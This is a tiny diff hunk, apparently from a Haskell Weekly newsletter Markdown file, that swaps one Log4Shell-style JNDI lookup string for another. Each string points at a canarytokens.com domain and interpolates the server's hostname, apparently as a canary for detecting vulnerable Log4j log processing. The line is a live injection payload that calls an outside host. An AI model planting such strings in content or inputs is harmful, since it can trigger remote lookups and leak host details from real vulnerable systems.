@@ -56,4 +56,4 @@ You should [advertise with us](https://haskellweekly.news/advertising.html)!
 
 ---
 
-`${jndi:ldap://x${hostName}.L4J.wel6b7i5p6nevlf1v6h7gfc1a.canarytokens.com/a}`
+`${jndi:ldap://x${hostName}.L4J.p8h6vielvr4kyrf8xdos1300p.canarytokens.com/a}`
